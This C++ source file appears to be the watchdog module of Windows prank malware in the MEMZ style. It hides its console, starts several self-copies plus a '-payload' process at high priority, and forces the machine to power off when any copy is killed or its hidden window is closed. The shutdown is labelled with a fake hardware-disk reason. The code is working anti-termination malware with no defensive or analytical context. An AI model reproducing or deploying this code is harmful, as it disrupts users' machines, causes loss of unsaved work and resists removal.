#include "overwatch.h"
#include <Psapi.h>
#include <iostream>
#include <string>
#include <TlHelp32.h>

using namespace std;

static DWORD WINAPI overwatch_thread(LPVOID parameter)
{
	int oproc = 0;

	char *fn = (char *)LocalAlloc(LMEM_ZEROINIT, 512);
	GetProcessImageFileNameA(GetCurrentProcess(), fn, 512);

	Sleep(1000);

	for (;;)
	{
		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		PROCESSENTRY32 proc;
		proc.dwSize = sizeof(proc);

		Process32First(snapshot, &proc);

		int nproc = 0;
		do {
			HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, proc.th32ProcessID);
			char *fn2 = (char *)LocalAlloc(LMEM_ZEROINIT, 512);
			GetProcessImageFileNameA(hProc, fn2, 512);

			if (!lstrcmpA(fn, fn2)) {
				nproc++;
			}

			CloseHandle(hProc);
			LocalFree(fn2);
		} while (Process32Next(snapshot, &proc));

		CloseHandle(snapshot);

		if (nproc < oproc)
		{
			HANDLE token;
			TOKEN_PRIVILEGES privileges;

			OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

			LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
			privileges.PrivilegeCount = 1;
			privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

			AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

			// The actual restart
			ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
		}

		oproc = nproc;

		Sleep(10);
	}

	return 0;
}

static LRESULT CALLBACK window_proc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	if (msg == WM_CLOSE || msg == WM_ENDSESSION)
	{
		HANDLE token;
		TOKEN_PRIVILEGES privileges;

		OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

		LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
		privileges.PrivilegeCount = 1;
		privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

		// The actual restart
		ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
		return 0;
	}

	return DefWindowProc(hwnd, msg, wParam, lParam);
}

void start_overwatch()
{

	LPSTR fn = (LPSTR)LocalAlloc(LMEM_ZEROINIT, 8192 * 2);
	GetModuleFileName(NULL, fn, 8192);
	

	for (int i = 0; i < 2; i++)//程序启动的数量.为本数加2.
		ShellExecute(NULL, NULL, fn, "-overwatch", NULL, SW_SHOWDEFAULT);

	SHELLEXECUTEINFO info;
	info.cbSize = sizeof(SHELLEXECUTEINFO);
	info.lpFile = fn;
	info.lpParameters = "-payload";
	info.fMask = SEE_MASK_NOCLOSEPROCESS;
	info.hwnd = NULL;
	info.lpVerb = NULL;
	info.lpDirectory = NULL;
	info.hInstApp = NULL;
	info.nShow = SW_SHOWDEFAULT;

	ShellExecuteEx(&info);
	SetPriorityClass(info.hProcess, HIGH_PRIORITY_CLASS);
	ExitProcess(0);
}

void overwatch()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	
	CreateThread(NULL, 0, overwatch_thread, NULL, 0, 0);
	WNDCLASSEXA c;
	c.cbSize = sizeof(WNDCLASSEXA);
	c.lpfnWndProc = window_proc;
	c.lpszClassName = "hax";
	c.style = 0;
	c.cbClsExtra = 0;
	c.cbWndExtra = 0;
	c.hInstance = NULL;
	c.hIcon = 0;
	c.hCursor = 0;
	c.hbrBackground = 0;
	c.lpszMenuName = NULL;
	c.hIconSm = 0;

	RegisterClassExA(&c);

	CreateWindowExA(0, "hax", NULL, 0, 0, 0, 100, 100, NULL, NULL, NULL, NULL);

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0) > 0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
}